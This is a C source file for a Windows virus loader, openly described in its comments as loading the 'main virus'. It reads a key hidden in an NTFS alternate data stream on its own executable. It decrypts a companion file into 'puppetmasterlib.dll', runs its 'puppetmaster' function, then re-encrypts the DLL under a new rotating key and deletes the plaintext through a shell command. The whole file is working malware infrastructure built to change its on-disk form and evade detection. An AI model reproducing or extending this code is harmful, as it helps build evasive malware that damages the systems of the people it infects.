#include <stdio.h>
#include <stdlib.h>
#include <windows.h>
#include <unistd.h>



typedef void (__cdecl *MYPROC)(int argc, TCHAR* argv[], int current_key);

int get_current_key(char * path){
  char * fullpath = (char *)malloc(300);
  strcpy(fullpath,path);
  strcat(fullpath,":vars");
  FILE * varsfile = fopen(fullpath,"r");
  char buff[5];
  fread(&buff,1,5,varsfile);
  int rVal = atoi(buff);
  return rVal;
}

void set_current_key(char * path, int key){
  char * current_cmd = (char *)malloc(300);
  sprintf(current_cmd,"echo %d",key);
  strcat(current_cmd," > ");
  strcat(current_cmd,path);
  strcat(current_cmd,":vars");
  system(current_cmd);
}


void decrypt_dll(char * path, int key){
  char * crypt_path = (char *)malloc(300);
  strcpy(crypt_path,path);
  crypt_path[strlen(crypt_path)-4] = '\0';
  strcat(crypt_path,".abc");
  FILE * crypt_file = fopen(crypt_path,"rb");
  char * decrypt_path = (char *)malloc(300);
  GetCurrentDirectory(300,decrypt_path);
  strcat(decrypt_path,"\\puppetmasterlib.dll");
  //printf("%s\n",decrypt_path);
  //strcpy(decrypt_path,path);
  //decrypt_path[strlen(decrypt_path)-4] = '\0';
  //strcat(decrypt_path,"lib.dll");
  FILE * decrypt_file = fopen(decrypt_path,"wb");
  int c;
  do {
    c = fgetc(crypt_file);
    fputc(c-key,decrypt_file);
  } while (c != EOF);
  fclose(crypt_file);
  fclose(decrypt_file);
}


void crypt_dll(char * path, int key){
  path[strlen(path)] = '\0';
  char * crypt_path = (char *)malloc(300);
  strcpy(crypt_path,path);
  crypt_path[strlen(crypt_path)-4] = '\0';
  strcat(crypt_path,".abc");
  FILE * crypt_file = fopen(crypt_path,"wb");
  char * decrypt_path = (char *)malloc(300);
  GetCurrentDirectory(300,decrypt_path);
  strcat(decrypt_path,"\\puppetmasterlib.dll");
  //strcpy(decrypt_path,path);
  //decrypt_path[strlen(decrypt_path)-4] = '\0';
  //strcat(decrypt_path,"lib.dll");
  FILE * decrypt_file = fopen(decrypt_path,"rb");
  int c;
  do {
    c = fgetc(decrypt_file);
    fputc(c+key,crypt_file);
  } while (c != EOF);
  fclose(crypt_file);
  fclose(decrypt_file);
  char * delete_cmd = (char *)malloc(300);
  strcpy(delete_cmd,"del ");
  strcat(delete_cmd,decrypt_path);
  system(delete_cmd);
  //printf("Running %s\n",delete_cmd);
}


int main(int argc, TCHAR * argv[]){
  //TODO:lock library location
  char * decrypt_path = (char *)malloc(300);
  GetCurrentDirectory(300,decrypt_path);
  strcat(decrypt_path,"\\puppetmasterlib.dll");
  //get current key
  int current_key = get_current_key(argv[0]);
  //printf("%d\n",current_key);
  //decrypt main virus
  decrypt_dll(argv[0],current_key);
  //load in actual virus
  HINSTANCE codelib;
  MYPROC maincode;
  BOOL fFreeResult, fRunTimeLinkSuccess = FALSE;
  codelib = LoadLibrary(TEXT(decrypt_path));
  if(codelib != NULL){
    maincode = (MYPROC) GetProcAddress(codelib, "puppetmaster");
    if(maincode != NULL){
      fRunTimeLinkSuccess = TRUE;
      (maincode) (argc, argv, current_key);
    }
    fFreeResult = FreeLibrary(codelib);
  }
  if(!fRunTimeLinkSuccess){
    printf("Unable to call the DLL function\n");
  }
  current_key++;
  if(current_key > 100){
    current_key = 0;
  }
  //recrypt
  crypt_dll(argv[0],current_key);
  //set current key
  set_current_key(argv[0],current_key);
  return 0;
}
